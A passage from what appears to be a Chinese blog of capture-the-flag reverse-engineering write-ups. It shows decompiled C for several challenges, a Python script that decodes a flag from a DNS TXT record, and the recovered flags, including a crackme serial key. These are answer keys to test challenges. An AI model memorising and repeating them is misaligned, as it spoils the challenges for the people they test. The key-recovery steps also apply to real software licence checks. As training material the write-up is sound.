class="number">34</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  n = v9 - src;</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v9 - src + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, src, n);</span><br><span class="line">  dest[n] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考别人的解释：</p><table><thead><tr><th style="text-align:center"><strong>函数原型</strong></th><th style="text-align:center"><strong>作用</strong></th></tr></thead><tbody><tr><td style="text-align:center">int res_query(const char *dname, int class, int type,unsigned char *answer,int anslen)</td><td style="text-align:center">查询名称服务器，以获得指定类型和类的完全限定域名。应答保留在调用方提供的<code>anslen</code>长度的缓冲区应答中</td></tr><tr><td style="text-align:center">int ns_initparse(const u_char *msg, int msglen, ns_msg *handle)</td><td style="text-align:center">在使用其他名称服务器库例程之前必须调用的第一个例程。nitparse填充句柄指向的数据结构，该句柄是传递给其他例程的参数</td></tr><tr><td style="text-align:center">int ns_parserr(ns_msg *handle, ns_sect section, int rrnum, ns_rr *rr)</td><td style="text-align:center">提取关于响应记录的信息并将其存储在rr中，rr是传递给其他名称服务器库例程的参数</td></tr><tr><td style="text-align:center">int ns_sprintrr(const ns_msg *handle, const ns_rr *rr, const char *name_ctx, const char *origin, char *buf, size_t buflen)</td><td style="text-align:center">将rr转换为表示格式</td></tr></tbody></table><p>开始没搞懂sub_18A4函数的功能，查询后是跟通信相关的函数，于是抓了个包，同时也验证了一下之前逆向的思路是否正确。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1569250903863.png" alt="1569250903863.png"></p><p>可以看到是拼接后再查TXT解析记录。</p><p>明确了思路，那么拿到TXT解析记录再解码就完事了:</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1569250467584.png" alt="1569250467584.png"></p><p>照样写了个解码脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">init_str = <span class="string">".fluxfingers.net"</span></span><br><span class="line">time = <span class="string">b"2012-12-21"</span></span><br><span class="line">time_hash = hashlib.md5(time)</span><br><span class="line"></span><br><span class="line">domin = time_hash.hexdigest() + init_str</span><br><span class="line"><span class="comment"># domin = "a0ab7eafc534bc4a8a48cd6e1cfc4d24.fluxfingers.net"</span></span><br><span class="line">TXT = dns.resolver.query(domin, <span class="string">'TXT'</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> TXT:</span><br><span class="line">    <span class="keyword">if</span> i.strings[<span class="number">0</span>]:</span><br><span class="line">        strs = i.strings[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> base64.decodebytes(strs):</span><br><span class="line">            flag += chr(j ^ <span class="number">0x25</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>说下这里的2012-12-21的思路问题：</p><p>开始打开题目给的网页的时候，发现好像跟题目无关，于是就瞟了一下，记住了2012和玛雅文明，逆到md5部分发现跟时间有关，于是想到了时间肯定是一个特定值，于是想到了2012，都要爆破了，然后查sub_18A4函数的时候看到了别人的writeup，知道是2012-12-21，于是就没有爆破了，只能说这个点确实有点脑洞。</p><p>解码结果：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1569250997311.png" alt="1569250997311.png"></p><p>flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e3a03c6f3fe91b40eaa8e71b41f0db12&#125;</span><br></pre></td></tr></table></figure><hr><h1>re10 srm-50</h1><p>这个题……</p><p>完全对不起他的分数好吗！！！</p><p>main()：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL __stdcall <span class="title">DialogFunc</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HMODULE v5; <span class="comment">// eax</span></span><br><span class="line">  HICON v6; <span class="comment">// eax</span></span><br><span class="line">  HMODULE v7; <span class="comment">// eax</span></span><br><span class="line">  HCURSOR v8; <span class="comment">// ST20_4</span></span><br><span class="line">  HWND v9; <span class="comment">// eax</span></span><br><span class="line">  CHAR <span class="keyword">String</span>; <span class="comment">// [esp+8h] [ebp-340h]</span></span><br><span class="line">  CHAR v11[<span class="number">4</span>]; <span class="comment">// [esp+108h] [ebp-240h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+10Ch] [ebp-23Ch] //从这里寄存器的位置来看，v12-v23是连续的，所以后面组合后的注册码顺序也要是这个</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [esp+10Dh] [ebp-23Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [esp+10Eh] [ebp-23Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [esp+10Fh] [ebp-239h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [esp+110h] [ebp-238h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [esp+111h] [ebp-237h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [esp+112h] [ebp-236h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [esp+113h] [ebp-235h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [esp+114h] [ebp-234h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [esp+115h] [ebp-233h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+116h] [ebp-232h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [esp+117h] [ebp-231h]</span></span><br><span class="line">  CHAR Text; <span class="comment">// [esp+208h] [ebp-140h]</span></span><br><span class="line">  <span class="keyword">char</span> Src[<span class="number">16</span>]; <span class="comment">// [esp+308h] [ebp-40h]</span></span><br><span class="line">  __int128 v26; <span class="comment">// [esp+318h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [esp+328h] [ebp-20h]</span></span><br><span class="line">  __int128 v28; <span class="comment">// [esp+32Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [esp+33Ch] [ebp-Ch]</span></span><br><span class="line">  __int16 v30; <span class="comment">// [esp+340h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    EndDialog(hDlg, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">272</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = GetModuleHandleW(<span class="number">0</span>);</span><br><span class="line">    v6 = LoadIconW(v5, (LPCWSTR)<span class="number">0x67</span>);</span><br><span class="line">    SetClassLongA(hDlg, <span class="number">-14</span>, (LONG)v6);</span><br><span class="line">    v7 = GetModuleHandleW(<span class="number">0</span>);</span><br><span class="line">    v8 = LoadCursorW(v7, (LPCWSTR)<span class="number">0x66</span>);</span><br><span class="line">    v9 = GetDlgItem(hDlg, <span class="number">1</span>);</span><br><span class="line">    SetClassLongA(v9, <span class="number">-12</span>, (LONG)v8);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">273</span> || (<span class="keyword">unsigned</span> __int16)a3 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;<span class="keyword">String</span>, (<span class="keyword">unsigned</span> __int16)a3 - <span class="number">1</span>, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Text, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  GetDlgItemTextA(hDlg, <span class="number">1001</span>, &amp;<span class="keyword">String</span>, <span class="number">256</span>);</span><br><span class="line">  GetDlgItemTextA(hDlg, <span class="number">1002</span>, v11, <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(&amp;<span class="keyword">String</span>, <span class="string">"@"</span>) &amp;&amp; <span class="built_in">strstr</span>(&amp;<span class="keyword">String</span>, <span class="string">"."</span>) &amp;&amp; <span class="built_in">strstr</span>(&amp;<span class="keyword">String</span>, <span class="string">"."</span>)[<span class="number">1</span>] &amp;&amp; <span class="built_in">strstr</span>(&amp;<span class="keyword">String</span>, <span class="string">"@"</span>)[<span class="number">1</span>] != <span class="string">'.'</span> )<span class="comment">// email的信息未指定，符合条件即可，也不参与运算</span></span><br><span class="line">  &#123;</span><br><span class="line">    v28 = xmmword_410AA0;                       <span class="comment">// "Registration fai"</span></span><br><span class="line">    v29 = 'erul';</span><br><span class="line">    *(_OWORD *)Src = xmmword_410A90;            <span class="comment">// "Registration SucRegistration fai"</span></span><br><span class="line">    v30 = <span class="string">'.'</span>;</span><br><span class="line">    v26 = xmmword_410A80;                       <span class="comment">// "Your flag Registration SucRegistration fai"</span></span><br><span class="line">    v27 = ':si';</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v11) != <span class="number">16</span></span><br><span class="line">      || v11[<span class="number">0</span>] != <span class="string">'C'</span></span><br><span class="line">      || v23 != <span class="string">'X'</span></span><br><span class="line">      || v11[<span class="number">1</span>] != <span class="string">'Z'</span></span><br><span class="line">      || v11[<span class="number">1</span>] + v22 != <span class="number">155</span>                    <span class="comment">// v22 == 'A'</span></span><br><span class="line">      || v11[<span class="number">2</span>] != <span class="string">'9'</span></span><br><span class="line">      || v11[<span class="number">2</span>] + v21 != <span class="number">155</span>                    <span class="comment">// v21 == 'b'</span></span><br><span class="line">      || v11[<span class="number">3</span>] != <span class="string">'d'</span></span><br><span class="line">      || v20 != <span class="string">'7'</span></span><br><span class="line">      || v12 != <span class="string">'m'</span></span><br><span class="line">      || v19 != <span class="string">'G'</span></span><br><span class="line">      || v13 != <span class="string">'q'</span></span><br><span class="line">      || v13 + v18 != <span class="number">170</span>                       <span class="comment">// v18 == '9'</span></span><br><span class="line">      || v14 != <span class="string">'4'</span></span><br><span class="line">      || v17 != <span class="string">'g'</span></span><br><span class="line">      || v15 != <span class="string">'c'</span></span><br><span class="line">      || v16 != <span class="string">'8'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      strcpy_s(&amp;Text, <span class="number">0x100</span>u, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v28);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      strcpy_s(&amp;Text, <span class="number">0x100</span>u, Src);</span><br><span class="line">      strcat_s(&amp;Text, <span class="number">0x100</span>u, v11);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    strcpy_s(&amp;Text, <span class="number">0x100</span>u, <span class="string">"Your E-mail address in not valid."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  MessageBoxA(hDlg, &amp;Text, <span class="string">"Registeration"</span>, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://sz.guiu.xyz/images/2020/02/25/1569254213469.png" alt="1569254213469.png"></p><p>此题终结。</p><p>flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CZ9dmq4c8g9G7bAX</span><br></pre></td></tr></table></figure><hr><h1>re11 ReverseMe-120</h1><p>这个题卡住了，看出来了是base64解码，但是解码表没搞明白，所以一开始一直按换表base64来解的。然后一直进行不下去了。</p><p>首先ida打开：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  __m128i v5; <span class="comment">// xmm1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">const</span> __m128i *v7; <span class="comment">// eax</span></span><br><span class="line">  __m128i v8; <span class="comment">// xmm0</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [esp+0h] [ebp-CCh]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+1h] [ebp-CBh]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [esp+64h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [esp+65h] [ebp-67h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// [esp+C8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please input your flah:"</span>);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v12, <span class="number">0</span>, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v11);</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v14, <span class="number">0</span>, <span class="number">0x63</span>u);</span><br><span class="line">  sub_401000(&amp;v15, &amp;v13, (<span class="keyword">unsigned</span> __int8 *)&amp;v11, <span class="built_in">strlen</span>(&amp;v11));<span class="comment">// 对输入的部分进行base64解码</span></span><br><span class="line">  v3 = v15;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v15 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v15 &gt;= <span class="number">16</span> )                            <span class="comment">// 中间这一部分就是垃圾代码</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = _mm_load_si128((<span class="keyword">const</span> __m128i *)&amp;xmmword_414F20);<span class="comment">// 414f20 = "%%%%%%%%%%%%%%%%H"</span></span><br><span class="line">      v6 = v15 - (v15 &amp; <span class="number">15</span>);</span><br><span class="line">      v7 = (<span class="keyword">const</span> __m128i *)&amp;v13;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v8 = _mm_loadu_si128(v7);</span><br><span class="line">        v4 += <span class="number">16</span>;</span><br><span class="line">        ++v7;</span><br><span class="line">        _mm_storeu_si128((__m128i *)&amp;v7[<span class="number">-1</span>], _mm_xor_si128(v8, v5));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v4 &lt; v6 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( ; v4 &lt; v3; ++v4 )</span><br><span class="line">      *(&amp;v13 + v4) ^= <span class="number">0x25</span>u;                    <span class="comment">// 解码完了与0x25异或，最后与"you_know_how_to_remove_junk_code"对比</span></span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">strcmp</span>(&amp;v13, <span class="string">"you_know_how_to_remove_junk_code"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    v9 = -(v9 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"wrong\n"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"correct\n"</span>);</span><br><span class="line">  system(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64解码部分：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __usercall sub_401000@&lt;eax&gt;(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1@&lt;edx&gt;, _BYTE *a2@&lt;ecx&gt;, <span class="keyword">unsigned</span> __int8 *a3, <span class="keyword">unsigned</span> <span class="keyword">int</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v7; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">bool</span> v9; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v10; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// cl</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v15; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// dl</span></span><br><span class="line">  _BYTE *v18; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v19; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v21; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+24h] [ebp+Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v18 = a2;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v19 = a1;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v7 = a3;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    v9 = v5 == a4;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; a4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a3[v5] != <span class="string">' '</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ++v5;</span><br><span class="line">        ++v8;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 &lt; a4 );</span><br><span class="line">      v9 = v5 == a4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a4 - v5 &gt;= <span class="number">2</span> &amp;&amp; a3[v5] == <span class="string">'\r'</span> &amp;&amp; a3[v5 + <span class="number">1</span>] == <span class="string">'\n'</span> || (v10 = a3[v5], v10 == <span class="string">'\n'</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v20;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-44</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v10 == <span class="string">'='</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)++v4 &gt; <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-44</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v10 &gt; <span class="string">''</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-44</span>;</span><br><span class="line">      v11 = byte_414E40[v10];</span><br><span class="line">      <span class="keyword">if</span> ( v11 == <span class="string">''</span> || (<span class="keyword">unsigned</span> __int8)v11 &lt; <span class="number">64u</span> &amp;&amp; v4 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-44</span>;</span><br><span class="line">      v6 = v20++ + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; a4 );</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v12 = v18;</span><br><span class="line">  v13 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">6</span> * v6 + <span class="number">7</span>) &gt;&gt; <span class="number">3</span>) - v4;</span><br><span class="line">  <span class="keyword">if</span> ( v18 &amp;&amp; *v19 &gt;= v13 )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = <span class="number">3</span>;</span><br><span class="line">    v14 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; v5; --v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = *v7;</span><br><span class="line">      <span class="keyword">if</span> ( *v7 != <span class="number">13</span> &amp;&amp; v15 != <span class="number">10</span> &amp;&amp; v15 != <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = byte_414E40[v15];                 <span class="comment">// 414e40 = "&gt;?456789:;&lt;=@"</span></span><br><span class="line">        v21 -= v16 == <span class="number">64</span>;</span><br><span class="line">        v14 = v16 &amp; <span class="number">63</span> | (v14 &lt;&lt; <span class="number">6</span>);</span><br><span class="line">        <span class="keyword">if</span> ( ++i == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          i = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v21 )</span><br><span class="line">            *v12++ = BYTE2(v14);</span><br><span class="line">          <span class="keyword">if</span> ( v21 &gt; <span class="number">1</span> )</span><br><span class="line">            *v12++ = BYTE1(v14);</span><br><span class="line">          <span class="keyword">if</span> ( v21 &gt; <span class="number">2</span> )</span><br><span class="line">            *v12++ = v14;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v7;</span><br><span class="line">    &#125;</span><br><span class="line">    *v19 = v12 - v18;</span><br><span class="line">    <span 